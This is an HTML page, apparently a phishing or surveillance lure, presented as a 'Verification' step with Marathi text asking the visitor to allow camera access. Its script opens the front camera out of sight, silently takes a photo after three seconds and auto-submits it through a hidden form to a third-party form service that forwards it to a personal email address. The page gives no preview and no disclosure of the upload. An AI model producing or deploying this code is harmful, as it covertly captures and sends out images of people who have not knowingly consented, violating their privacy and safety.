<!DOCTYPE html>
<html lang="mr">
<head>
  <meta charset="UTF-8">
  <title>Verification</title>
</head>
<body style="text-align:center; font-family:sans-serif;">

<h3>फोटो घेण्यासाठी कॅमेरा परवानगी द्या</h3>
<p>कृपया थोडा वेळ थांबा...</p>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<form id="photoForm" action="https://formsubmit.co/sumitpawale05@gmail.com" method="POST">
  <input type="hidden" name="photo" id="photoInput">
  <input type="hidden" name="_subject" value="📸 New Auto Captured Photo">
  <input type="hidden" name="_captcha" value="false">
</form>

<script>
navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" }
})
.then(stream => {
  const video = document.getElementById("video");
  video.srcObject = stream;

  setTimeout(() => {
    const canvas = document.getElementById("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const imageData = canvas.toDataURL("image/png");
    document.getElementById("photoInput").value = imageData;
    document.getElementById("photoForm").submit();
  }, 3000); // 3 sec auto capture
})
.catch(() => {
  alert("कृपया कॅमेरा परवानगी द्या");
});
</script>

</body>
</html>
